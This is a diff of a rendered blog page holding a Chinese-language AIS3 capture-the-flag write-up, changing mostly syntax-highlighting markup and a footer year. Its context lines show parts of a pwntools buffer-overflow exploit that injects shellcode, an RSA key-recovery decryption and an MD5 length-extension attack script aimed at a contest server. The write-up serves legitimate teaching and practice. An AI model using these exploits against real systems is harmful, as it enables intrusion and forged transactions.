 	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ecx address: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">ecx_addr</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">))</span>
 
-	<span class="c"># restore stack</span>
-	<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="n">temp</span><span class="p">):</span>
+	<span class="c1"># restore stack
+</span>	<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="n">temp</span><span class="p">):</span>
 		<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 		<span class="n">push</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
 
-	<span class="c"># shellcode</span>
-	<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
+	<span class="c1"># shellcode
+</span>	<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
 		<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 		<span class="n">push</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
 
-	<span class="c"># padding</span>
-	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">23</span><span class="p">):</span>
+	<span class="c1"># padding
+</span>	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">23</span><span class="p">):</span>
 		<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 		<span class="n">push</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
 
-	<span class="c"># important address for ecx</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+	<span class="c1"># important address for ecx
+</span>	<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 	<span class="n">push</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">ecx_addr</span><span class="p">)</span>
 
-	<span class="c"># padding</span>
-	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="mi">29</span><span class="p">):</span>
+	<span class="c1"># padding
+</span>	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="mi">29</span><span class="p">):</span>
 		<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 		<span class="n">push</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
 
-	<span class="c"># return address</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+	<span class="c1"># return address
+</span>	<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 	<span class="n">push</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">)</span>
 
-	<span class="c"># invoke BOF</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+	<span class="c1"># invoke BOF
+</span>	<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"4. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 	<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"4"</span><span class="p">)</span>
 
 	<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
@@ -776,11 +776,11 @@ exit 則是離開程式</p>
 直接 google “vigenere cipher decoder”，找到了一堆網站<br />
 通通丟進去解，接著開始拼拼湊湊( 總不可能解完整 )<br />
 最後靠著 <a href="http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx">這個</a> 還有 <a href="https://f00l.de/hacking/vigenere.php">這個</a> 推出 key 的位置在</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://ctf.ais3.org/files/thekeyofvigenerehahaha.txt
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://ctf.ais3.org/files/thekeyofvigenerehahaha.txt
 </code></pre></div></div>
 <p>進去之後就是 flag 了</p>
 
-<p>flag:<code class="highlighter-rouge">AIS3{i_am_scared_of_you}</code></p>
+<p>flag:<code class="language-plaintext highlighter-rouge">AIS3{i_am_scared_of_you}</code></p>
 
 <h2 id="crypto2">CRYPTO2</h2>
 <p>基礎的 RSA cracking<br />
@@ -799,17 +799,17 @@ rsa.py 裡面則是提供了 n 和 e</p>
 
 <p>有了 p 跟 q 之後就可以利用 <a href="https://github.com/ius/rsatool">rsatool</a> 來產生 PEM encode 後的 private key<br />
 openssl 指令下一下之後就可以解出 flag 了</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl rsautl -in flag.enc -inkey key.pem -decrypt
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl rsautl -in flag.enc -inkey key.pem -decrypt
 </code></pre></div></div>
 
-<p>flag:<code class="highlighter-rouge">AIS3{rsaaaaaaaaA_orz}</code></p>
+<p>flag:<code class="language-plaintext highlighter-rouge">AIS3{rsaaaaaaaaA_orz}</code></p>
 
 <h2 id="crypto3">CRYPTO3</h2>
 <p>耗費最多心力的一題，解完之後經驗值又增加了 XD</p>
 
 <p>給了一份 buy.py</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
-
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+</span>
 <span class="kn">import</span> <span class="nn">os</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">import</span> <span class="nn">signal</span>
@@ -957,31 +957,31 @@ openssl 指令下一下之後就可以解出 flag 了</p>
 <p>第一關還好，寫個 script 爆一下就 ok 了<br />
 重點是第二關<br />
 買橘子在 check out 的時候會要先給它一個 order information<br />
-形式為: <code class="highlighter-rouge">"num=XXX&amp;price=XXX-----[md5 hash]"</code><br />
-其中 md5 hash 那邊是指 <code class="highlighter-rouge">"num=XXX&amp;price=XXX"</code> 的 md5 hash</p>
+形式為: <code class="language-plaintext highlighter-rouge">"num=XXX&amp;price=XXX-----[md5 hash]"</code><br />
+其中 md5 hash 那邊是指 <code class="language-plaintext highlighter-rouge">"num=XXX&amp;price=XXX"</code> 的 md5 hash</p>
 
-<p>程式會將 <code class="highlighter-rouge">-----</code> 之前的字串視為 data, 之後的字串 ( 就是 md5 hash ) 視為 hmac<br />
+<p>程式會將 <code class="language-plaintext highlighter-rouge">-----</code> 之前的字串視為 data, 之後的字串 ( 就是 md5 hash ) 視為 hmac<br />
 我們輸入 order information 的時候，程式會先做以下檢查<br />
-<code class="highlighter-rouge">md5(key[:16]+data) == hmac</code> ( key 未知 )<br />
+<code class="language-plaintext highlighter-rouge">md5(key[:16]+data) == hmac</code> ( key 未知 )<br />
 通過的話才會讓我們 check out (正式扣錢，買到橘子)</p>
 
 <p>問題在於我們一開始的錢是 100 塊<br />
 理論上不管怎麼買都不可能買到 1000000<br />
-手上握有的資訊就只有 <code class="highlighter-rouge">"num=XXX&amp;price=10"</code> ( XXX 可控 ) 和其 md5 hash 值<br />
+手上握有的資訊就只有 <code class="language-plaintext highlighter-rouge">"num=XXX&amp;price=10"</code> ( XXX 可控 ) 和其 md5 hash 值<br />
 因此在這裡卡了一段時間</p>
 
 <p>之後才發現有個 attack 叫做 Length Extension Attack (LEA)<br />
 詳情可參考 <a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks">這篇</a> 和 <a href="http://ddaa.logdown.com/posts/194524-plaid-ctf-2014-crypto-250-parlor">這篇</a>
-簡單來說就是如果我有辦法知道 <code class="highlighter-rouge">md5(a)</code> 的值<br />
-那麼我就可以預測 <code class="highlighter-rouge">md5(a + padding + append)</code> 的值<br />
-其中 <code class="highlighter-rouge">padding</code> 字串須透過計算來得到<br />
-而 <code class="highlighter-rouge">append</code> 則是我們想要附加上去的字串</p>
+簡單來說就是如果我有辦法知道 <code class="language-plaintext highlighter-rouge">md5(a)</code> 的值<br />
+那麼我就可以預測 <code class="language-plaintext highlighter-rouge">md5(a + padding + append)</code> 的值<br />
+其中 <code class="language-plaintext highlighter-rouge">padding</code> 字串須透過計算來得到<br />
+而 <code class="language-plaintext highlighter-rouge">append</code> 則是我們想要附加上去的字串</p>
 
-<p>也就是說，假設今天我們知道 <code class="highlighter-rouge">key[:16]+"num=11111111&amp;price=10"</code> 的 md5 hash 值<br />
-我們就可以預測 <code class="highlighter-rouge">key[:16]+"num=11111111&amp;price=10" + [padding] + "&amp;price=-1"</code> 的 md5 hash 值<br />
+<p>也就是說，假設今天我們知道 <code class="language-plaintext highlighter-rouge">key[:16]+"num=11111111&amp;price=10"</code> 的 md5 hash 值<br />
+我們就可以預測 <code class="language-plaintext highlighter-rouge">key[:16]+"num=11111111&amp;price=10" + [padding] + "&amp;price=-1"</code> 的 md5 hash 值<br />
 如此一來就可以構造假的 order information 來繞過檢查，買到 11111111 個價值 -1 塊的橘子<br />
 我們的錢就可以突破 1000000 了<br />
-( 注意在 checkout 時 price 的值是用 <code class="highlighter-rouge">info.get('price', 10)</code> 來得到的，因此 <code class="highlighter-rouge">...&amp;price=10abcdefg...&amp;price=-1</code>, 所拿到的值最終會是 -1 )</p>
+( 注意在 checkout 時 price 的值是用 <code class="language-plaintext highlighter-rouge">info.get('price', 10)</code> 來得到的，因此 <code class="language-plaintext highlighter-rouge">...&amp;price=10abcdefg...&amp;price=-1</code>, 所拿到的值最終會是 -1 )</p>
 
 <p>網路上也已經有工具幫我們做這件事了 – <a href="https://github.com/bwall/HashPump">HashPump</a><br />
 可以直接算出 padding 和預測出來的 md5 hash 值<br />
@@ -994,15 +994,15 @@ openssl 指令下一下之後就可以解出 flag 了</p>
 最後直接手動建了 key length = 1 ~ 16 的 payload 和 hash 值一個一個送<br />
 才發現 key length = 12…</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">itertools</span>
 <span class="kn">import</span> <span class="nn">hashlib</span>
 <span class="kn">import</span> <span class="nn">subprocess</span>
 
 <span class="n">HOST</span> <span class="o">=</span> <span class="s">"52.69.163.194"</span>
-<span class="c">#HOST = "localhost"</span>
-<span class="n">PORT</span> <span class="o">=</span> <span class="mi">7788</span>
+<span class="c1">#HOST = "localhost"
+</span><span class="n">PORT</span> <span class="o">=</span> <span class="mi">7788</span>
 
 <span class="n">all_str</span> <span class="o">=</span> <span class="p">[</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">)]</span>
 
@@ -1044,7 +1044,7 @@ openssl 指令下一下之後就可以解出 flag 了</p>
 
 </code></pre></div></div>
 
-<p>flag: <code class="highlighter-rouge">AIS3{give_me_mdfive}</code></p>
+<p>flag: <code class="language-plaintext highlighter-rouge">AIS3{give_me_mdfive}</code></p>
 
 <h1 id="心得">心得</h1>
 <p>這次的題目大部分都出得很不錯<br />
@@ -1197,7 +1197,6 @@ openssl 指令下一下之後就可以解出 flag 了</p>
       <div class="grid__wrapper">
         
           
-          
 
 
 
@@ -1217,7 +1216,6 @@ openssl 指令下一下之後就可以解出 flag 了</p>
 
         
           
-          
 
 
 
@@ -1236,7 +1234,6 @@ openssl 指令下一下之後就可以解出 flag 了</p>
 </div>
 
         
-          
           
 
 
@@ -1259,7 +1256,6 @@ openssl 指令下一下之後就可以解出 flag 了</p>
 
         
           
-          
 
 
 
@@ -1280,6 +1276,7 @@ openssl 指令下一下之後就可以解出 flag 了</p>
         
       </div>
     </div>
+  
   
 </div>
 
@@ -1330,7 +1327,7 @@ openssl 指令下一下之後就可以解出 flag 了</p>
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2019 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+<div class="page__footer-copyright">&copy; 2020 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
 
       </footer>
     </div>
